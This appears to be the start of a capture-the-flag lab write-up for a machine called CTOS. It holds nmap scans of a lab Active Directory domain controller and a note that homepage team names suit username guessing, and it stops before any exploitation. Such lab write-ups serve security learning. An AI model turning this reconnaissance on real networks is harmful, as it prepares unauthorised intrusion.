# CTOS

## Enumeration&#x20;

### Nmap scan&#x20;

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 10:48 -0400
Nmap scan report for 10.1.240.67
Host is up (0.028s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

└─# nmap 10.1.97.103 10.1.50.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 10:48 -0400
Nmap scan report for 10.1.50.113
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


nmap 10.1.97.103 -Pn 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 10:48 -0400
Nmap scan report for 10.1.97.103
Host is up (0.028s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds



PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-10-29 14:50:47Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Issuer: commonName=CTOS-DC01-CA/domainComponent=CTOS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-15T20:12:45
| Not valid after:  2027-02-15T20:12:45
| MD5:     d5ba 9de3 f858 7311 990e 51f7 1f3c b418
| SHA-1:   f703 b2a9 eaea afd8 7aee 7123 48b0 97e0 73ab 2749
| SHA-256: 1357 e947 e4c9 3fba 3a95 7d78 fe6b fcfd f707 e91f 3b41 6af9 2238 3e2f d631 b40f
| -----BEGIN CERTIFICATE-----
| MIIGHTCCBQWgAwIBAgITJQAAAAIP/9fB9XzVOgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBDMRQwEgYKCZImiZPyLGQBGRYEQ09SUDEUMBIGCgmSJomT8ixkARkWBENUT1Mx
| FTATBgNVBAMTDENUT1MtREMwMS1DQTAeFw0yNjAyMTUyMDEyNDVaFw0yNzAyMTUy
| MDEyNDVaMBkxFzAVBgNVBAMTDkRDMDEuQ1RPUy5DT1JQMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAy4jHZ5h8tASELFQ7Vz8t4jwrvyws4DobiwCwnU9/
| Ic9iMRHZy44C51s3TfueLFtIv6Gi90A0NxONIJ4iOnRui/4nlzWAQVzNR60hP6Om
| hrAx49rgOpBjTFWrLk3B5fC2S3QtsjFr/wd2BSEYEh/Z9ZXNpSTojM6nX/isqQyM
| BlTp0PiaGXpV6EkHOxlgz4qhwL5OymcVdnSx6F7R2pf8B5lhJzMnX1D8wqjwgXZc
| Ub+FuyLnRq9f85HCkFiZlztU/o43kN4a6di6Glse912+M5ZtV4LEapsUGkJwdWG0
| cKJ+eWsowODa9UmqJibXXjUN48Fb4JuRwTUPYHEdjyhkbQIDAQABo4IDMjCCAy4w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUrFyXk0+/h+Ht/qCE
| wlKSyEUBCdowHwYDVR0jBBgwFoAU4pZltQR07atKi2GRTGC6XTkJAWIwgcUGA1Ud
| HwSBvTCBujCBt6CBtKCBsYaBrmxkYXA6Ly8vQ049Q1RPUy1EQzAxLUNBLENOPURD
| MDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBvAYIKwYBBQUHAQEEga8wgawwgakGCCsGAQUFBzAChoGcbGRhcDovLy9DTj1D
| VE9TLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDoGA1UdEQQzMDGgHwYJKwYBBAGCNxkBoBIEEMq6EMjhoTRBlWyJ8ERDvHKCDkRD
| MDEuQ1RPUy5DT1JQME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5T
| LTEtNS0yMS0xNzUxNDY4MzIzLTI2MjMzNTU2MzgtMjcxODg1NDk0NC0xMDAwMA0G
| CSqGSIb3DQEBCwUAA4IBAQCpvMunyEHUkMaBdcBcU2jf0U92Zqu9PqdKgEE029o3
| o1eTc+tqtJshaG34W0H9wcSl71kfmdIrCEKh7bBhXFqGzps3ZFdMER2oqIyAvAyG
| 5hhfLbDf3N219Hc+kEw201o70dqJJS2TcEbuUspFSb12L8l+r9/YWUt6q60/+kYQ
| JpHjpfg7iY4EdVOAFI8MXz3s9zCRNBLxObglxuUocJLiY13NjqTAiFQtQrQXkgK9
| bEr9l8QAu6Cy/fSciylMM8+YCyqaSaca5MN4Hlqmw9G3ru1/kzVBTKy/xJb4B0bZ
| t4/z6AhCk0yT7NYrxqFtWbQK7bzAKP60LfB7KEU4siql
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Issuer: commonName=CTOS-DC01-CA/domainComponent=CTOS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-15T20:12:45
| Not valid after:  2027-02-15T20:12:45
| MD5:     d5ba 9de3 f858 7311 990e 51f7 1f3c b418
| SHA-1:   f703 b2a9 eaea afd8 7aee 7123 48b0 97e0 73ab 2749
| SHA-256: 1357 e947 e4c9 3fba 3a95 7d78 fe6b fcfd f707 e91f 3b41 6af9 2238 3e2f d631 b40f
| -----BEGIN CERTIFICATE-----
| MIIGHTCCBQWgAwIBAgITJQAAAAIP/9fB9XzVOgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBDMRQwEgYKCZImiZPyLGQBGRYEQ09SUDEUMBIGCgmSJomT8ixkARkWBENUT1Mx
| FTATBgNVBAMTDENUT1MtREMwMS1DQTAeFw0yNjAyMTUyMDEyNDVaFw0yNzAyMTUy
| MDEyNDVaMBkxFzAVBgNVBAMTDkRDMDEuQ1RPUy5DT1JQMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAy4jHZ5h8tASELFQ7Vz8t4jwrvyws4DobiwCwnU9/
| Ic9iMRHZy44C51s3TfueLFtIv6Gi90A0NxONIJ4iOnRui/4nlzWAQVzNR60hP6Om
| hrAx49rgOpBjTFWrLk3B5fC2S3QtsjFr/wd2BSEYEh/Z9ZXNpSTojM6nX/isqQyM
| BlTp0PiaGXpV6EkHOxlgz4qhwL5OymcVdnSx6F7R2pf8B5lhJzMnX1D8wqjwgXZc
| Ub+FuyLnRq9f85HCkFiZlztU/o43kN4a6di6Glse912+M5ZtV4LEapsUGkJwdWG0
| cKJ+eWsowODa9UmqJibXXjUN48Fb4JuRwTUPYHEdjyhkbQIDAQABo4IDMjCCAy4w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUrFyXk0+/h+Ht/qCE
| wlKSyEUBCdowHwYDVR0jBBgwFoAU4pZltQR07atKi2GRTGC6XTkJAWIwgcUGA1Ud
| HwSBvTCBujCBt6CBtKCBsYaBrmxkYXA6Ly8vQ049Q1RPUy1EQzAxLUNBLENOPURD
| MDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBvAYIKwYBBQUHAQEEga8wgawwgakGCCsGAQUFBzAChoGcbGRhcDovLy9DTj1D
| VE9TLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDoGA1UdEQQzMDGgHwYJKwYBBAGCNxkBoBIEEMq6EMjhoTRBlWyJ8ERDvHKCDkRD
| MDEuQ1RPUy5DT1JQME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5T
| LTEtNS0yMS0xNzUxNDY4MzIzLTI2MjMzNTU2MzgtMjcxODg1NDk0NC0xMDAwMA0G
| CSqGSIb3DQEBCwUAA4IBAQCpvMunyEHUkMaBdcBcU2jf0U92Zqu9PqdKgEE029o3
| o1eTc+tqtJshaG34W0H9wcSl71kfmdIrCEKh7bBhXFqGzps3ZFdMER2oqIyAvAyG
| 5hhfLbDf3N219Hc+kEw201o70dqJJS2TcEbuUspFSb12L8l+r9/YWUt6q60/+kYQ
| JpHjpfg7iY4EdVOAFI8MXz3s9zCRNBLxObglxuUocJLiY13NjqTAiFQtQrQXkgK9
| bEr9l8QAu6Cy/fSciylMM8+YCyqaSaca5MN4Hlqmw9G3ru1/kzVBTKy/xJb4B0bZ
| t4/z6AhCk0yT7NYrxqFtWbQK7bzAKP60LfB7KEU4siql
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Issuer: commonName=CTOS-DC01-CA/domainComponent=CTOS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-15T20:12:45
| Not valid after:  2027-02-15T20:12:45
| MD5:     d5ba 9de3 f858 7311 990e 51f7 1f3c b418
| SHA-1:   f703 b2a9 eaea afd8 7aee 7123 48b0 97e0 73ab 2749
| SHA-256: 1357 e947 e4c9 3fba 3a95 7d78 fe6b fcfd f707 e91f 3b41 6af9 2238 3e2f d631 b40f
| -----BEGIN CERTIFICATE-----
| MIIGHTCCBQWgAwIBAgITJQAAAAIP/9fB9XzVOgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBDMRQwEgYKCZImiZPyLGQBGRYEQ09SUDEUMBIGCgmSJomT8ixkARkWBENUT1Mx
| FTATBgNVBAMTDENUT1MtREMwMS1DQTAeFw0yNjAyMTUyMDEyNDVaFw0yNzAyMTUy
| MDEyNDVaMBkxFzAVBgNVBAMTDkRDMDEuQ1RPUy5DT1JQMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAy4jHZ5h8tASELFQ7Vz8t4jwrvyws4DobiwCwnU9/
| Ic9iMRHZy44C51s3TfueLFtIv6Gi90A0NxONIJ4iOnRui/4nlzWAQVzNR60hP6Om
| hrAx49rgOpBjTFWrLk3B5fC2S3QtsjFr/wd2BSEYEh/Z9ZXNpSTojM6nX/isqQyM
| BlTp0PiaGXpV6EkHOxlgz4qhwL5OymcVdnSx6F7R2pf8B5lhJzMnX1D8wqjwgXZc
| Ub+FuyLnRq9f85HCkFiZlztU/o43kN4a6di6Glse912+M5ZtV4LEapsUGkJwdWG0
| cKJ+eWsowODa9UmqJibXXjUN48Fb4JuRwTUPYHEdjyhkbQIDAQABo4IDMjCCAy4w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUrFyXk0+/h+Ht/qCE
| wlKSyEUBCdowHwYDVR0jBBgwFoAU4pZltQR07atKi2GRTGC6XTkJAWIwgcUGA1Ud
| HwSBvTCBujCBt6CBtKCBsYaBrmxkYXA6Ly8vQ049Q1RPUy1EQzAxLUNBLENOPURD
| MDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBvAYIKwYBBQUHAQEEga8wgawwgakGCCsGAQUFBzAChoGcbGRhcDovLy9DTj1D
| VE9TLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDoGA1UdEQQzMDGgHwYJKwYBBAGCNxkBoBIEEMq6EMjhoTRBlWyJ8ERDvHKCDkRD
| MDEuQ1RPUy5DT1JQME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5T
| LTEtNS0yMS0xNzUxNDY4MzIzLTI2MjMzNTU2MzgtMjcxODg1NDk0NC0xMDAwMA0G
| CSqGSIb3DQEBCwUAA4IBAQCpvMunyEHUkMaBdcBcU2jf0U92Zqu9PqdKgEE029o3
| o1eTc+tqtJshaG34W0H9wcSl71kfmdIrCEKh7bBhXFqGzps3ZFdMER2oqIyAvAyG
| 5hhfLbDf3N219Hc+kEw201o70dqJJS2TcEbuUspFSb12L8l+r9/YWUt6q60/+kYQ
| JpHjpfg7iY4EdVOAFI8MXz3s9zCRNBLxObglxuUocJLiY13NjqTAiFQtQrQXkgK9
| bEr9l8QAu6Cy/fSciylMM8+YCyqaSaca5MN4Hlqmw9G3ru1/kzVBTKy/xJb4B0bZ
| t4/z6AhCk0yT7NYrxqFtWbQK7bzAKP60LfB7KEU4siql
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: CTOS.CORP, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.CTOS.CORP
| Issuer: commonName=CTOS-DC01-CA/domainComponent=CTOS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-15T20:12:45
| Not valid after:  2027-02-15T20:12:45
| MD5:     d5ba 9de3 f858 7311 990e 51f7 1f3c b418
| SHA-1:   f703 b2a9 eaea afd8 7aee 7123 48b0 97e0 73ab 2749
| SHA-256: 1357 e947 e4c9 3fba 3a95 7d78 fe6b fcfd f707 e91f 3b41 6af9 2238 3e2f d631 b40f
| -----BEGIN CERTIFICATE-----
| MIIGHTCCBQWgAwIBAgITJQAAAAIP/9fB9XzVOgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBDMRQwEgYKCZImiZPyLGQBGRYEQ09SUDEUMBIGCgmSJomT8ixkARkWBENUT1Mx
| FTATBgNVBAMTDENUT1MtREMwMS1DQTAeFw0yNjAyMTUyMDEyNDVaFw0yNzAyMTUy
| MDEyNDVaMBkxFzAVBgNVBAMTDkRDMDEuQ1RPUy5DT1JQMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAy4jHZ5h8tASELFQ7Vz8t4jwrvyws4DobiwCwnU9/
| Ic9iMRHZy44C51s3TfueLFtIv6Gi90A0NxONIJ4iOnRui/4nlzWAQVzNR60hP6Om
| hrAx49rgOpBjTFWrLk3B5fC2S3QtsjFr/wd2BSEYEh/Z9ZXNpSTojM6nX/isqQyM
| BlTp0PiaGXpV6EkHOxlgz4qhwL5OymcVdnSx6F7R2pf8B5lhJzMnX1D8wqjwgXZc
| Ub+FuyLnRq9f85HCkFiZlztU/o43kN4a6di6Glse912+M5ZtV4LEapsUGkJwdWG0
| cKJ+eWsowODa9UmqJibXXjUN48Fb4JuRwTUPYHEdjyhkbQIDAQABo4IDMjCCAy4w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUrFyXk0+/h+Ht/qCE
| wlKSyEUBCdowHwYDVR0jBBgwFoAU4pZltQR07atKi2GRTGC6XTkJAWIwgcUGA1Ud
| HwSBvTCBujCBt6CBtKCBsYaBrmxkYXA6Ly8vQ049Q1RPUy1EQzAxLUNBLENOPURD
| MDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBvAYIKwYBBQUHAQEEga8wgawwgakGCCsGAQUFBzAChoGcbGRhcDovLy9DTj1D
| VE9TLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Q1RPUyxEQz1DT1JQP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDoGA1UdEQQzMDGgHwYJKwYBBAGCNxkBoBIEEMq6EMjhoTRBlWyJ8ERDvHKCDkRD
| MDEuQ1RPUy5DT1JQME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5T
| LTEtNS0yMS0xNzUxNDY4MzIzLTI2MjMzNTU2MzgtMjcxODg1NDk0NC0xMDAwMA0G
| CSqGSIb3DQEBCwUAA4IBAQCpvMunyEHUkMaBdcBcU2jf0U92Zqu9PqdKgEE029o3
| o1eTc+tqtJshaG34W0H9wcSl71kfmdIrCEKh7bBhXFqGzps3ZFdMER2oqIyAvAyG
| 5hhfLbDf3N219Hc+kEw201o70dqJJS2TcEbuUspFSb12L8l+r9/YWUt6q60/+kYQ
| JpHjpfg7iY4EdVOAFI8MXz3s9zCRNBLxObglxuUocJLiY13NjqTAiFQtQrQXkgK9
| bEr9l8QAu6Cy/fSciylMM8+YCyqaSaca5MN4Hlqmw9G3ru1/kzVBTKy/xJb4B0bZ
| t4/z6AhCk0yT7NYrxqFtWbQK7bzAKP60LfB7KEU4siql
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.CTOS.CORP
| Issuer: commonName=DC01.CTOS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-12T15:59:39
| Not valid after:  2027-02-11T15:59:39
| MD5:     ebdf cb8c 8807 acf0 1c2f 4600 ca02 e3ad
| SHA-1:   a811 4abb dd37 fa7f 2116 1e33 2592 907f b044 337d
| SHA-256: b2d9 aff7 dc57 cd6a 6dee eddc ef73 d822 a9c0 4b4f b690 8d17 571a c280 a18e 791f
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQFVCc1w2g/rJEU5W7VxYSZDANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5EQzAxLkNUT1MuQ09SUDAeFw0yNjA4MTIxNTU5MzlaFw0yNzAy
| MTExNTU5MzlaMBkxFzAVBgNVBAMTDkRDMDEuQ1RPUy5DT1JQMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlMTOszpm+9eRv7pDi2CrXN7cn8VKFxPpge3w
| nvRy1EZ+jWmn3s2JZq0SXvUukyUI2C5vOf51KHefdjmSRrNlBibp4bz0WVurVRfb
| GxhI0BGhiE82scspuzg+/n1BLJn9e5Vi1u/rIUXfsrDSfwn5VVjKdIqdbPxelKUI
| G/TX883aFZkKCBF6RI2Dfai1gt7JXDIobA+BiOFsAoruMh7ENrYHeMQ5BrjuAWhu
| BLXFsKwQfZkEvnM26zW4n7T2reOpfUkBgA1LQyMzDJv9H5J36NozTO4YvrgRDa1v
| y95ky5st+XS3usiggezG24jfHPnKXx2ri/rO6h0fOyNxmPiB8QIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAHEgDC+hCDSX30lb885K8XSPfsaDycXNlvbHEG6/c/y+Zv2JQddEW3JzVOvB
| MSZtK23NjSp5qNbZW3FcXhheIXdIHpmC8F494oYlQ9UXNOgD8o7trwzvrLcpamSn
| Mgw6tNglY1haD1ZQoWI52wX134LSQkqakYRCuHFfbYPTM2OO8L9mxhkZni3UkV9J
| 6TdCyhfn47LSaX50CE+xakAKCm54mxMelLpLUD9f9Kn1oAbAqeHmpx4o0tmL2rw/
| 8nfkvOisliRgragwDK5PP4SpVMLmHACkSgn0fHeBF2s2pPce2gUg76cTGUKWBuEi
| Vw6ikBtVJ/NM0vOT67D7Y6tNWVc=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-29T14:51:58+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CTOS
|   NetBIOS_Domain_Name: CTOS
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: CTOS.CORP
|   DNS_Computer_Name: DC01.CTOS.CORP
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-29T14:51:50+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49721/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49795/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 11 24H2 - 25H2 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (90%), Microsoft Windows 11 24H2 (89%), Microsoft Windows Server 2019 (88%), Microsoft Windows Server 2012 (88%), Microsoft Windows 10 1703 (87%), Microsoft Windows 10 1511 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=10/29%OT=53%CT=%CU=36635%PV=Y%DS=3%DC=T%G=N%TM=6AE35D91%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10A%TI=RD%CI=RI%TS=A)
SEQ(SP=FE%GCD=1%ISR=10C%TI=I%CI=I%TS=A)
OPS(O1=M510NW8ST11%O2=M510NW8ST11%O3=M510NW8NNT11%O4=M510NW8ST11%O5=M510NW8ST11%O6=M510ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M510NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.008 days (since Thu Oct 29 10:40:58 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-29T14:51:53
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48731/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12792/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41915/udp): CLEAN (Timeout)
|   Check 4 (port 8811/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   201.98 ms 10.200.0.1
2   ...
3   203.31 ms 10.1.240.67
```



### Port 80 - HTTP

I checked out the main homepage and found a list of team names and info, which gave me some great targets for username guessing.

<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

